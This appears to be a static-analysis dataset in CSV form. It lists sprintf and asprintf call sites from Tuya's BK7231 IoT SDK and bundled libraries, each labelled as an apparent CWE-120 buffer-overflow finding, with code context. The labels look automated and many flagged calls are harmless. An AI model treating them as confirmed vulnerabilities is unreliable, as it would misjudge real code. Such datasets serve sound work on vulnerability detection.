2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"int __wrap_asprintf(char **ret, const char *format, ...)",120,1,"}

int __wrap_asprintf(char **ret, const char *format, ...)
{
	va_list ap;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"len = __wrap_vasprintf(ret, format, ap);",120,1,"
	va_start(ap, format);
	len = __wrap_vasprintf(ret, format, ap);
	va_end(ap);
	return len;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"int __wrap_sprintf(char *str, const char *format, ...)",120,1,"}

int __wrap_sprintf(char *str, const char *format, ...)
{
	va_list ap;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\test_fatfs.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\test_fatfs.c,"sprintf(pathTemp, ""%s/%s"", path, fno.fname);",120,1,"                /* It is a directory */
                char pathTemp[255];
                sprintf(pathTemp, ""%s/%s"", path, fno.fname);
                fr = scan_files(pathTemp);      /* Enter the directory */
                if (fr != FR_OK) break;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\test_fatfs.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\test_fatfs.c,"sprintf(cFileName, ""%d:"", number);",120,1,"	}

    sprintf(cFileName, ""%d:"", number);
    fr = f_mount(pfs, cFileName, 1);
    if (fr != FR_OK)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\test_fatfs.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\test_fatfs.c,"sprintf(cFileName, ""%d:%s"", number, TEST_MP3_FILE_NAME);",120,1,"
    os_printf(""\r\n----- test_fatfs %d start -----\r\n"", number);
    sprintf(cFileName, ""%d:%s"", number, TEST_MP3_FILE_NAME);
    os_printf(""f_open \""%s\""\r\n"", cFileName);
    fr = f_open(&file, cFileName, FA_OPEN_EXISTING | FA_READ);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,"wsprintf(buf, L""%S"", str);",120,1,"	if (buf == NULL)
		return NULL;
	wsprintf(buf, L""%S"", str);
	return buf;
#else /* UNICODE */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,"sprintf((char*)temp, ""%02x"", psk[i]);",120,1,"	for(i = 0; i < 32; i++)
	{
		sprintf((char*)temp, ""%02x"", psk[i]);
		strcat((char*)bssid_info.psk, (char*)temp);
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"sprintf(curSubdir, """");  */",120,1,"    (includeHttpHeader ? ""be"" : ""not be""));

  sprintf(curSubdir, """");  /* start off in web page's root directory - relative paths */
  os_printf(""  Processing all files in directory %s"", path);
  if (processSubs) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"sprintf(lastFileVar, ""NULL"");",120,1,"#endif

  sprintf(lastFileVar, ""NULL"");

  filesProcessed = process_sub(data_file, struct_file);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"sprintf(&file_buffer_c[off], ""0x%02.2x,"", file_data[i]);",120,1,"  for (i = 0; i < file_size; i++) {
    LWIP_ASSERT(""file_buffer_c overflow"", off < sizeof(file_buffer_c) - 5);
    sprintf(&file_buffer_c[off], ""0x%02.2x,"", file_data[i]);
    off += 5;
    if ((++src_off % HEX_BYTES_PER_LINE) == 0) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"sprintf(&new_name[len], ""%d"", cnt);",120,1,"            cnt++;
            /* try next unique file name */
            sprintf(&new_name[len], ""%d"", cnt);
            break;
         }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"sprintf(qualifiedName,""%s/%s"", curSubdir, filename);",120,1,"
  /* create qualified name (@todo: prepend slash or not?) */
  sprintf(qualifiedName,""%s/%s"", curSubdir, filename);
  /* create C variable name */
  strcpy(varname, qualifiedName);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"sprintf(&buf[idx], ""0x%02.2x,"", cur);",120,1,"  for (x = 0; x < len; x++) {
    unsigned char cur = ascii_string[x];
    sprintf(&buf[idx], ""0x%02.2x,"", cur);
    idx += 5;
    if ((++(*i) % HEX_BYTES_PER_LINE) == 0) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"sprintf(&buf[idx], NEWLINE);",120,1,"    idx += 5;
    if ((++(*i) % HEX_BYTES_PER_LINE) == 0) {
      sprintf(&buf[idx], NEWLINE);
      idx += NEWLINE_LEN;
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap_ms.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap_ms.c,"sprintf((char *)&authResponse[i * 2], ""%02X"", Digest[i]);",120,1,"    /* Convert to ASCII hex string. */
    for (i = 0; i < LWIP_MAX((MS_AUTH_RESPONSE_LENGTH / 2), (int)sizeof(Digest)); i++)
	sprintf((char *)&authResponse[i * 2], ""%02X"", Digest[i]);
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\eui64.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\eui64.c,"sprintf(buf, ""%02x%02x:%02x%02x:%02x%02x:%02x%02x"",",120,1,"    static char buf[20];

    sprintf(buf, ""%02x%02x:%02x%02x:%02x%02x:%02x%02x"",
	     e.e8[0], e.e8[1], e.e8[2], e.e8[3], 
	     e.e8[4], e.e8[5], e.e8[6], e.e8[7]);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ipv6cp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ipv6cp.c,"sprintf(b, ""fe80::%02x%02x:%02x%02x:%02x%02x:%02x%02x"",",120,1,"    static char b[26];

    sprintf(b, ""fe80::%02x%02x:%02x%02x:%02x%02x:%02x%02x"",
      ifaceid.e8[0], ifaceid.e8[1], ifaceid.e8[2], ifaceid.e8[3],
      ifaceid.e8[4], ifaceid.e8[5], ifaceid.e8[6], ifaceid.e8[7]);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ipv6cp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ipv6cp.c,"sprintf(strspeed, ""%d"", baud_rate);",120,1,"    char *argv[8];

    sprintf(strspeed, ""%d"", baud_rate);
    strcpy(strlocal, llv6_ntoa(ipv6cp_gotoptions[0].ourid));
    strcpy(strremote, llv6_ntoa(ipv6cp_hisoptions[0].hisid));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\mppe.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\mppe.c,"sprintf(mkey + i * 2, ""%02x"", state->master_key[i]);",120,1,"
		for (i = 0; i < (int)sizeof(state->master_key); i++)
			sprintf(mkey + i * 2, ""%02x"", state->master_key[i]);
		for (i = 0; i < (int)sizeof(state->session_key); i++)
			sprintf(skey + i * 2, ""%02x"", state->session_key[i]);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\mppe.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\mppe.c,"sprintf(skey + i * 2, ""%02x"", state->session_key[i]);",120,1,"			sprintf(mkey + i * 2, ""%02x"", state->master_key[i]);
		for (i = 0; i < (int)sizeof(state->session_key); i++)
			sprintf(skey + i * 2, ""%02x"", state->session_key[i]);
		PPPDEBUG(LOG_DEBUG,
		       (""%s[%d]: keys: master: %s initial session: %s\n"",
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\extral_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\extral_cli.c,"sprintf(&name_diff[0], ""%02x"", *ptr);",120,1,"    ptr = &mac_addr[4];
    *ptr = ((*ptr & 0x0f) << 4) | ((*ptr & 0xf0) >> 4);
    sprintf(&name_diff[0], ""%02x"", *ptr);
    
    ptr = &mac_addr[5];
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\extral_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\extral_cli.c,"sprintf(&name_diff[2], ""%02x"", *ptr);",120,1,"    ptr = &mac_addr[5];
    *ptr = ((*ptr & 0x0f) << 4) | ((*ptr & 0xf0) >> 4);
    sprintf(&name_diff[2], ""%02x"", *ptr);
    
    name_diff[4] = '\0';
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,"int sprintf(char* buf, const char *fmt, ...);",120,1,"#elif defined(WOLFSSL_SGX)
    /* Declare sprintf for ocall */
    int sprintf(char* buf, const char *fmt, ...);
#elif defined(WOLFSSL_DEOS)
#elif defined(MICRIUM)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,"sprintf(line, ""\t"");",120,1,"        }

        sprintf(line, ""\t"");

        for (i = 0; i < LINE_LEN; i++) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,"sprintf(line + 1 + i * 3,""%02x "", buffer[i]);",120,1,"        for (i = 0; i < LINE_LEN; i++) {
            if (i < length)
                sprintf(line + 1 + i * 3,""%02x "", buffer[i]);
            else
                sprintf(line + 1 + i * 3, ""   "");
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,"sprintf(line + 1 + i * 3, ""   "");",120,1,"                sprintf(line + 1 + i * 3,""%02x "", buffer[i]);
            else
                sprintf(line + 1 + i * 3, ""   "");
        }

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,"sprintf(line + 1 + LINE_LEN * 3, ""| "");",120,1,"        }

        sprintf(line + 1 + LINE_LEN * 3, ""| "");

        for (i = 0; i < LINE_LEN; i++)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfcrypt\src\logging.c,"sprintf(line + 3 + LINE_LEN * 3 + i,",120,1,"        for (i = 0; i < LINE_LEN; i++)
            if (i < length)
                sprintf(line + 3 + LINE_LEN * 3 + i,
                     ""%c"", 31 < buffer[i] && buffer[i] < 127 ? buffer[i] : '.');

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfssl\test.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfssl\test.h,"strLen = sprintf(serialMsg, "" %s"", words[3]);",120,1,"        /* testsuite has multiple threads writing to stdout, get output
           message ready to write once */
        strLen = sprintf(serialMsg, "" %s"", words[3]);
        for (i = 0; i < sz; i++)
            sprintf(serialMsg + strLen + (i*3), "":%02x "", serial[i]);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfssl\test.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfssl\test.h,"sprintf(serialMsg + strLen + (i*3), "":%02x "", serial[i]);",120,1,"        strLen = sprintf(serialMsg, "" %s"", words[3]);
        for (i = 0; i < sz; i++)
            sprintf(serialMsg + strLen + (i*3), "":%02x "", serial[i]);
        printf(""%s\n"", serialMsg);
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\rtos_pub.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\rtos_pub.c,"sprintf( pcTaskStatusStrTmp, ""\t%c\t%u\t%u\t%u\r\n"", cStatus,",120,1,"
            /* Write the rest of the string. */
            sprintf( pcTaskStatusStrTmp, ""\t%c\t%u\t%u\t%u\r\n"", cStatus,
                     BK_PRIORITY_TO_NATIVE_PRIORITY((unsigned int) pxTaskStatusArray[x].uxCurrentPriority),
                     (unsigned int) pxTaskStatusArray[x].usStackHighWaterMark,
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\tasks.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\tasks.c,"sprintf( pcWriteBuffer, ""\t%c\t%u\t%u\t%u\r\n"", cStatus, ( unsigned int ) pxTaskStatusArray[ x ].uxCurrentPriority, ( unsigned int ) pxTaskStatusArray[ x ].usStackHighWaterMark, ( unsigned int ) pxTaskStatusArray[ x ].xTaskNumber );",120,1,"
				/* Write the rest of the string. */
				sprintf( pcWriteBuffer, ""\t%c\t%u\t%u\t%u\r\n"", cStatus, ( unsigned int ) pxTaskStatusArray[ x ].uxCurrentPriority, ( unsigned int ) pxTaskStatusArray[ x ].usStackHighWaterMark, ( unsigned int ) pxTaskStatusArray[ x ].xTaskNumber );
				pcWriteBuffer += strlen( pcWriteBuffer );
			}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\tasks.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\tasks.c,"sprintf( pcWriteBuffer, ""\t%u\t\t%u%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter, ( unsigned int ) ulStatsAsPercentage );",120,1,"							/* sizeof( int ) == sizeof( long ) so a smaller
							printf() library can be used. */
							sprintf( pcWriteBuffer, ""\t%u\t\t%u%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter, ( unsigned int ) ulStatsAsPercentage );
						}
						#endif
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\tasks.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\tasks.c,"sprintf( pcWriteBuffer, ""\t%u\t\t<1%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter );",120,1,"							/* sizeof( int ) == sizeof( long ) so a smaller
							printf() library can be used. */
							sprintf( pcWriteBuffer, ""\t%u\t\t<1%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter );
						}
						#endif
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\arm-none-eabi\armv6-m\bits\c++locale.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\arm-none-eabi\armv6-m\bits\c++locale.h,"const int __ret = __builtin_vsprintf(__out, __fmt, __args);",120,1,"    const int __ret = __builtin_vsnprintf(__out, __size, __fmt, __args);
#else
    const int __ret = __builtin_vsprintf(__out, __fmt, __args);
#endif

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\ext\throw_allocator.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\ext\throw_allocator.h,"__builtin_sprintf(buf, ""%lu"", l);",120,1,"      s += ""label: "";
      unsigned long l = static_cast<unsigned long>(ref.second.first);
      __builtin_sprintf(buf, ""%lu"", l);
      s += buf;
      s += tab;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\ext\throw_allocator.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\ext\throw_allocator.h,"__builtin_sprintf(buf, ""%p"", ref.first);",120,1,"      s += tab;
      s += ""address: "";
      __builtin_sprintf(buf, ""%p"", ref.first);
      s += buf;
      s += '\n';
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\ext\throw_allocator.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\ext\throw_allocator.h,"__builtin_sprintf(buf, ""%f"", random);",120,1,"	  __s += ""random number generated is: "";
	  char buf[40];
	  __builtin_sprintf(buf, ""%f"", random);
	  __s += buf;
	  std::__throw_out_of_range(__s.c_str());
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\defaults.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\defaults.h,"sprintf (output_, ASM_PN_FORMAT, name_, (unsigned long)(LABELNO)); \",120,1,"       char *const output_ = (OUTPUT) = \
	 (char *) alloca (strlen (name_) + 32); \
       sprintf (output_, ASM_PN_FORMAT, name_, (unsigned long)(LABELNO)); \
  } while (0)
#endif
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\libiberty.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\libiberty.h,"extern int asprintf (char **, const char *, ...) ATTRIBUTE_PRINTF_2;",120,1,"   be freed by the caller.  */

extern int asprintf (char **, const char *, ...) ATTRIBUTE_PRINTF_2;
#endif

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\libiberty.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\libiberty.h,"extern int vasprintf (char **, const char *, va_list) ATTRIBUTE_PRINTF(2,0);",120,1,"   must be freed by the caller.  */

extern int vasprintf (char **, const char *, va_list) ATTRIBUTE_PRINTF(2,0);
#endif

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\pretty-print.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\pretty-print.h,"sprintf (pp_buffer (PP)->digit_buffer, FORMAT, SCALAR); \",120,1,"  do					        	      \
    {			         			      \
      sprintf (pp_buffer (PP)->digit_buffer, FORMAT, SCALAR); \
      pp_string (PP, pp_buffer (PP)->digit_buffer);           \
    }						              \
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\config\arm\aout.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\config\arm\aout.h,"sprintf (STRING, ""*%s%s%u"", LOCAL_LABEL_PREFIX, PREFIX, (unsigned int)(NUM))",120,1,"#ifndef ASM_GENERATE_INTERNAL_LABEL
#define ASM_GENERATE_INTERNAL_LABEL(STRING, PREFIX, NUM)  \
  sprintf (STRING, ""*%s%s%u"", LOCAL_LABEL_PREFIX, PREFIX, (unsigned int)(NUM))
#endif
     
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_bl0937_1_plug_demo\src\app_switch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_bl0937_1_plug_demo\src\app_switch.c,"sprintf(dpid_str, ""%d"", i);",120,1,"    for(i = 0;i < g_hw_table.channel_num;i++){
        if(g_hw_table.channels[i].init_ch_stat == INIT_CH_MEM){
            sprintf(dpid_str, ""%d"", i);
            cJSON_AddBoolToObject(root,dpid_str,g_hw_table.channels[i].stat);
        }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\board.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\board.c,"sprintf(format, ""0%d%c"", bJustification, type);",120,1,"    if(bJustification)
    {
        sprintf(format, ""0%d%c"", bJustification, type);
    }
    else
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\board.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\board.c,"sprintf(format, ""%c"", type);",120,1,"    else
    {
        sprintf(format, ""%c"", type);
    }
    fmt[0] = '%';
"
